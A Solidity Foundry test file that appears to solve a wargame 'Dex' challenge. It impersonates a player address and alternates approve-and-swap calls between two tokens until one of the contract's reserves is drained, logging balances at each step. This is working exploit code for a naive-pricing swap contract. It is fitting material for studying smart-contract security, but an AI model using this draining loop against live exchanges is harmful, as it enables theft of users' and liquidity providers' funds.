// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../Dex.sol";

contract DexTest is DSTest {
    Dex obj;
    Vm vm = Vm(HEVM_ADDRESS);
    address player_address;
    address contract_address;
    function setUp() public {
        contract_address = 0x776333ed340d4a71B38479364F51e2b24afDc572;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        obj = Dex(contract_address);
    }

    function testDexTop() public {
        vm.startPrank(player_address);
        address token1 = obj.token1();
        address token2 = obj.token2();
        uint256 t1 = obj.balanceOf(token1, contract_address);
        uint256 t2 = obj.balanceOf(token2, contract_address);
        uint256 p1 = obj.balanceOf(token1, player_address);
        uint256 p2 = obj.balanceOf(token2, player_address);
        uint256 val;
        bool toggle;
        uint256 i;
        while(t1 != 0 && t2 != 0 && (p1 + p2) != 0) {
            console.log("Iteration #", i++);
            console.log("token1 =", t1);
            console.log("token2 =", t2);
        
            console.log("player token1 =", p1);
            console.log("player token2 =", p2);
            // val = p1 > p2 ? p1 : p2;
            if (p1 > p2) {
                val = t1 > p1 ? p1 : t1;
            } else {
                val = t2 > p2 ? p2 : t2;
            }
            console.log("Approved :", val);
            obj.approve(contract_address, val);
            if(toggle) {
                obj.swap(token2, token1, val);
            } else {
                obj.swap(token1, token2, val);
            }

            t1 = obj.balanceOf(token1, contract_address);
            t2 = obj.balanceOf(token2, contract_address);
            console.log("token1 =", t1);
            console.log("token2 =", t2);
            p1 = obj.balanceOf(token1, player_address);
            p2 = obj.balanceOf(token2, player_address);
            console.log("player token1 =", p1);
            console.log("player token2 =", p2);
            toggle = !toggle;
            console.log("");
        }
        assert(t1 == 0 || t2 == 0);
    }
}
